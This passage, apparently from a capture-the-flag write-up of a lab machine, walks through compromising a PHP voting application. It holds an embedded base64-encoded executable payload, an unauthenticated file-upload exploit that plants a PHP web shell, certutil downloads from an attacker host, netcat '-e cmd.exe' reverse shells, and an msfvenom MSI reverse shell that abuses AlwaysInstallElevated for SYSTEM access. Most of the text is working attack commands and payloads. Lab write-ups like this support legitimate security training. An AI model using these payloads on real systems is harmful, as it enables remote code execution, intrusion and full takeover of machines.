</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Shell called check your listiner&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Start a NC listner on the port you choose above and run...&#34;</span>)
</span></span><span style="display:flex;"><span>sendPayload()
</span></span><span style="display:flex;"><span>callShell()
</span></span></code></pre></div><p>The payload that is being used in this exploit is a compiled binary encoded into base64, So we don&rsquo;t know what this binary may possibly do to the target system other than getting a reverse shell for us.</p>
<p>We can further analyze the payload the above exploit is using.</p>
<p>Decoding the payload , Save the below php code as payload.php and run it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">gzinflate</span>( <span style="color:#a6e22e">base64_decode</span>(<span style="color:#e6db74">&#34;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&#34;</span>));
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>Run the php code to get the decoded binary code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>php payload.php &gt; shell.exe <span style="color:#f92672">&amp;&amp;</span> file shell.exe
</span></span></code></pre></div><p>We can figure out that the payload is a Portable Executable 32-bit.</p>
<pre tabindex="0"><code>└─# file shell.exe 
shell.exe: PE32 executable (console) Intel 80386 (stripped to external PDB
</code></pre><p>So we do not have the executable source code to figure out what it is doing while running on target system, So its not a good idea to run such exploits during live pentest engagement. <a href="https://www.virustotal.com/gui/file/c2c295e38ec2529a47c3e54c0ec87576b96b8bb2bfdee2964f58efe8ba873b86/community">Here</a> is the virustotal scan of the payload binary . But we are not in real pentest engagement So let&rsquo;s fire up the modified exploit.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 49445.py
</span></span></code></pre></div><p>Run the netcat reverse shell as well</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lnvp <span style="color:#ae81ff">9000</span>
</span></span></code></pre></div><p>We got the shell as <code>love\phoebe</code>  user,</p>
<p><img src="/assets/Pasted%20image%2020220417021324.png" alt="assets/Pasted image 20220417021324.png"></p>
<h4 id="manul-exploitation-unauthenticated-rce">Manul Exploitation (Unauthenticated RCE)</h4>
<p>Let&rsquo;s get the exploit instructions file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>searchsploit voting system remote code execution
</span></span></code></pre></div><p><img src="/assets/Pasted%20image%2020220417023751.png" alt="assets/Pasted image 20220417023751.png"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>searchsploit -m 49846.txt 
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># Exploit Title: Voting System 1.0 - Remote Code Execution (Unauthenticated)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Date: 07/05/2021</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit Author: secure77</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Vendor Homepage: https://www.sourcecodester.com/php/12306/voting-system-using-php.html</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Software Link: https://www.sourcecodester.com/download-code?nid=12306&amp;title=Voting+System+using+PHP%2FMySQLi+with+Source+Code</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Version: 1.0</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Tested on: Linux Debian 5.10.28-1kali1 (2021-04-12) x86_64 // PHP Version 7.4.15 &amp; Built-in HTTP server // mysql Ver 15.1 Distrib 10.5.9-MariaDB</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Unauthenticated file upload is possible via /admin/candidates_add.php that can use <span style="color:#66d9ef">for</span> RCE.
</span></span><span style="display:flex;"><span>Your upload will be stored at /images/ and is also accessible without authentication.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">########################### Vulnerable code ############################</span>
</span></span><span style="display:flex;"><span>&lt;?php
</span></span><span style="display:flex;"><span>	include <span style="color:#e6db74">&#39;includes/session.php&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>isset<span style="color:#f92672">(</span>$_POST<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;add&#39;</span><span style="color:#f92672">])){</span>
</span></span><span style="display:flex;"><span>		$firstname <span style="color:#f92672">=</span> $_POST<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;firstname&#39;</span><span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>		$lastname <span style="color:#f92672">=</span> $_POST<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;lastname&#39;</span><span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>		$position <span style="color:#f92672">=</span> $_POST<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;position&#39;</span><span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>		$platform <span style="color:#f92672">=</span> $_POST<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;platform&#39;</span><span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>		$filename <span style="color:#f92672">=</span> $_FILES<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;photo&#39;</span><span style="color:#f92672">][</span><span style="color:#e6db74">&#39;name&#39;</span><span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>!empty<span style="color:#f92672">(</span>$filename<span style="color:#f92672">)){</span>
</span></span><span style="display:flex;"><span>			move_uploaded_file<span style="color:#f92672">(</span>$_FILES<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;photo&#39;</span><span style="color:#f92672">][</span><span style="color:#e6db74">&#39;tmp_name&#39;</span><span style="color:#f92672">]</span>, <span style="color:#e6db74">&#39;../images/&#39;</span>.$filename<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		$sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;INSERT INTO candidates (position_id, firstname, lastname, photo, platform) VALUES (&#39;</span>$position<span style="color:#e6db74">&#39;, &#39;</span>$firstname<span style="color:#e6db74">&#39;, &#39;</span>$lastname<span style="color:#e6db74">&#39;, &#39;</span>$filename<span style="color:#e6db74">&#39;, &#39;</span>$platform<span style="color:#e6db74">&#39;)&#34;</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>$conn-&gt;query<span style="color:#f92672">(</span>$sql<span style="color:#f92672">)){</span>
</span></span><span style="display:flex;"><span>			$_SESSION<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;success&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Candidate added successfully&#39;</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>			$_SESSION<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;error&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> $conn-&gt;error;
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>		$_SESSION<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;error&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Fill up add form first&#39;</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	header<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;location: candidates.php&#39;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>?&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">########################### Payload ############################</span>
</span></span><span style="display:flex;"><span>POST /admin/candidates_add.php HTTP/1.1
</span></span><span style="display:flex;"><span>Host: 192.168.1.1
</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">275</span>
</span></span><span style="display:flex;"><span>Cache-Control: max-age<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Origin: http://192.168.1.1
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>DNT: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Content-Type: multipart/form-data; boundary<span style="color:#f92672">=</span>----WebKitFormBoundaryrmynB2CmGO6vwFpO
</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>Windows NT 10.0; Win64; x64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/90.0.4430.93 Safari/537.36
</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style="color:#f92672">=</span>0.8,application/signed-exchange;v<span style="color:#f92672">=</span>b3;q<span style="color:#f92672">=</span>0.9
</span></span><span style="display:flex;"><span>Referer: http://192.168.1.1/admin/candidates.php
</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
</span></span><span style="display:flex;"><span>Accept-Language: de-DE,de;q<span style="color:#f92672">=</span>0.9,en-US;q<span style="color:#f92672">=</span>0.8,en;q<span style="color:#f92672">=</span>0.7
</span></span><span style="display:flex;"><span>Connection: close
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>------WebKitFormBoundaryrmynB2CmGO6vwFpO
</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;photo&#34;</span>; filename<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;shell.php&#34;</span>
</span></span><span style="display:flex;"><span>Content-Type: application/octet-stream
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;?php echo exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;whoami&#34;</span><span style="color:#f92672">)</span>; ?&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>------WebKitFormBoundaryrmynB2CmGO6vwFpO
</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;add&#34;</span>
</span></span></code></pre></div><p>Above exploit payload request didn&rsquo;t worked out , So had to modify it a little bit.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>POST /admin/candidates_add.php HTTP/1.1
</span></span><span style="display:flex;"><span>Host: 10.10.10.239
</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:78.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/78.0
</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/webp,*/*;q<span style="color:#f92672">=</span>0.8
</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
</span></span><span style="display:flex;"><span>Content-Type: multipart/form-data; boundary<span style="color:#f92672">=</span>---------------------------290048668839075589812361472324
</span></span><span style="display:flex;"><span>Origin: http://10.10.10.239
</span></span><span style="display:flex;"><span>Connection: close
</span></span><span style="display:flex;"><span>Referer: http://10.10.10.239/admin/candidates.php
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Sec-GPC: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">309</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-----------------------------290048668839075589812361472324
</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;photo&#34;</span>; filename<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;shell.php&#34;</span>
</span></span><span style="display:flex;"><span>Content-Type: application/octet-stream
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;?php system<span style="color:#f92672">(</span>$_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;cmd&#39;</span><span style="color:#f92672">])</span>; ?&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-----------------------------290048668839075589812361472324
</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;add&#34;</span>
</span></span></code></pre></div><p>This request will upload a shell.php file , which can be found at /images/shell.php directory.
To run a system command we can pass the command as url parameter.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>curl http://10.10.10.239/images/shell.php?cmd<span style="color:#f92672">=</span>whoami
</span></span></code></pre></div><p><img src="/assets/Pasted%20image%2020220417025646.png" alt="assets/Pasted image 20220417025646.png"></p>
<p>Let&rsquo;s get the reverse shell on the target system using netcat binary, First let&rsquo;s upload the binary from attacker server to target machine by using certutil.exe</p>
<p>On attacker machine, Locate the nc.exe binary and copy the nc</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>certutil.exe -urlcache -f http://10.10.14.12/nc.exe nc.exe
</span></span><span style="display:flex;"><span>nc.exe -e cmd.exe &lt;Attacker_IP&gt; &lt;PORT&gt;
</span></span><span style="display:flex;"><span>python3 -m http.server
</span></span></code></pre></div><p>Uploading the nc.exe to target machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>http://10.10.10.239/images/shell.php?cmd<span style="color:#f92672">=</span>certutil.exe%20-urlcache%20-f%20http://10.10.14.12:4000/nc.exe%20nc.exe
</span></span></code></pre></div><p>Running a netcat listener</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lnvp <span style="color:#ae81ff">4444</span>
</span></span></code></pre></div><p>Using the uploaded nc.exe to get the reverse shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>http://10.10.10.239/images/shell.php?cmd<span style="color:#f92672">=</span>nc.exe%20-e%20cmd.exe%2010.10.14.12%204444
</span></span></code></pre></div><p>We got the reverse shell.</p>
<p><img src="/assets/Pasted%20image%2020220417050938.png" alt="assets/Pasted image 20220417050938.png"></p>
<p>Let&rsquo;s grab the user flag.</p>
<p><img src="/assets/Pasted%20image%2020220417051340.png" alt="assets/Pasted image 20220417051340.png"></p>
<p>To get the root Flag we have to escalate privilege.</p>
<hr>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Let&rsquo;s upload the winpeas binary to the target system using certutil. And try to find ossible privilege escalation vectors.</p>
<p>Download the winpeas Binary from <a href="https://github.com/carlospolop/PEASS-ng/releases">here</a>,</p>
<p>Let&rsquo;s use certutil to upload the winpeas binary to target machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>certutil.exe -urlcache -f http://10.10.14.12:4000/winpeas.exe winpeas.exe
</span></span></code></pre></div><p>Running the winpeas.exe binary</p>
<p><img src="/assets/Pasted%20image%2020220417053137.png" alt="assets/Pasted image 20220417053137.png"></p>
<p>AlwaysInstallElevated is set to 1 which means we can run/execute any .msi file as SYSTEM or ADMIN.</p>
<p>So let&rsquo;s create a windows reverse shell with .msi format and upload that to the target machine and execute it, to get a reverse shell as ADMIN.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msfvenom -p windows/shell_reverse_tcp -f msi lport<span style="color:#f92672">=</span><span style="color:#ae81ff">5555</span> lhost<span style="color:#f92672">=</span>10.10.14.12 -o shell.msi
</span></span></code></pre></div><p>Uploading the shell to target machine.</p>
